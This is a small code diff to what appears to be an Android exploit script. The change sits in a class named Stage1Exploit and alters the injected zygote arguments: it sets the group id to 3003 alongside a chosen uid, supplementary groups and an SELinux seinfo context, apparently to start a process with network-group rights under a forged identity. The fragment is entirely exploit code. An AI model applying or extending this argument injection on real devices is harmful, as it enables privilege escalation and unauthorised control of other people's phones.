@@ -188,7 +188,7 @@ class Stage1Exploit:
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=10078",
-            "--setgid=10078",
+            "--setgid=3003",
             "--setgroups=3003",
             "--runtime-args",
             "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
